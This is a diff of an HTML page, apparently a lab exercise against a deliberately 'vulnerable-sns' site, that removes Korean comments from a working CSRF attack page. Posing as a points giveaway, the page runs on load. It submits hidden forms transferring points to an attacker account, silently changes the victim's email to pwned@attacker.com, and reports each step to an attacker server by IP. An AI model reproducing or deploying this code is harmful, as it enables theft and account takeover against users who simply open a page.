@@ -87,7 +87,6 @@
         <div class="success" id="success">✅ 완료!</div>
     </div>
     
-    <!-- 숨겨진 CSRF 폼들 -->
     <div id="csrfForms"></div>
     
     <script>
@@ -95,16 +94,12 @@
         const ATTACKER_ID = '1';
         const TARGET_SNS = 'http://18.179.53.107/vulnerable-sns/www';
         
-        // 페이지 로드 시 자동 실행
         window.onload = function() {
-            // 공격자 서버에 페이지 로드 알림
             fetch('http://13.158.67.78:5000/notify?event=page_loaded&time=' + new Date().toISOString())
                 .catch(() => {});
             
-            // 상태 업데이트
             document.getElementById('status').innerHTML = '포인트를 받기 위해 준비 중...';
             
-            // 2초 후 자동 실행
             setTimeout(() => {
                 executeCSRF();
             }, 2000);
@@ -125,11 +120,9 @@
             document.getElementById('claimBtn').style.display = 'none';
             document.getElementById('loading').style.display = 'block';
             
-            // 여러 금액으로 순차 공격 (하나라도 성공하면 OK)
             const amounts = [5000, 3000, 1000, 500, 300, 100];
             let formHTML = '';
             
-            // 각 금액별로 폼 생성
             amounts.forEach((amount, index) => {
                 formHTML += `
                     <form id="csrfForm${index}" method="POST" action="${TARGET_SNS}/profile.php" style="display:none" target="iframe${index}">
@@ -143,7 +136,6 @@
                 `;
             });
             
-            // GET 방식 CSRF도 추가 (프로필 변경)
             formHTML += `
                 <img src="${TARGET_SNS}/profile.php?email=pwned@attacker.com&full_name=HACKED_BY_CSRF" 
                      style="display:none" 
@@ -152,7 +144,6 @@
             
             document.getElementById('csrfForms').innerHTML = formHTML;
             
-            // 순차적으로 폼 제출 (0.5초 간격)
             amounts.forEach((amount, index) => {
                 setTimeout(() => {
                     const form = document.getElementById('csrfForm' + index);
@@ -160,18 +151,15 @@
                         form.submit();
                         console.log('[+] Submitted form for ' + amount + 'P');
                         
-                        // 공격자 서버에 알림
                         fetch('http://13.158.67.78:5000/notify?event=csrf_attempt&amount=' + amount + '&index=' + index)
                             .catch(() => {});
                         
-                        // 상태 업데이트
                         document.getElementById('status').innerHTML = 
                             '시도 ' + (index + 1) + '/' + amounts.length + ': ' + amount + ' 포인트';
                     }
                 }, index * 500);
             });
             
-            // 모든 시도 완료 후
             setTimeout(() => {
                 document.getElementById('loading').style.display = 'none';
                 document.getElementById('success').innerHTML = 
@@ -179,7 +167,6 @@
                 document.getElementById('success').style.display = 'block';
                 document.getElementById('status').style.display = 'none';
                 
-                // 최종 성공 알림
                 fetch('http://13.158.67.78:5000/notify?event=csrf_completed&attempts=' + amounts.length)
                     .catch(() => {});
                 
